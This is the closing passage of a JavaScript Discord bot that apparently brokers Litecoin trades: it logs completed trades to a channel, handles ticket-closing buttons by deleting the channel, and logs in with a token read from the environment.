  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
  if (logsChannel) {
    const sender = await client.users.fetch(trade.senderId);
    const receiver = await client.users.fetch(trade.receiverId);
    const logEmbed = new EmbedBuilder()
      .setTitle('✅ Trade Completed')
      .setColor(0x00ff00)
      .setDescription(`${amountSent} LTC ($${usdValue} USD)`)
      .addFields(
        { name: 'Sender', value: sender.username, inline: true },
        { name: 'Receiver', value: receiver.username, inline: true },
        { name: 'Transaction ID', value: shortTxId, inline: true }
      )
      .setTimestamp();
    await logsChannel.send({ embeds: [logEmbed] });
  }
  
  trade.status = 'completed';
  trades.set(channelId, trade);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('close_ticket_')) {
    const channelId = interaction.customId.split('_')[2];
    await interaction.reply('🔒 Closing ticket...');
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 3000);
  }
});

// ========== START BOT ==========
client.login(process.env.DISCORD_TOKEN);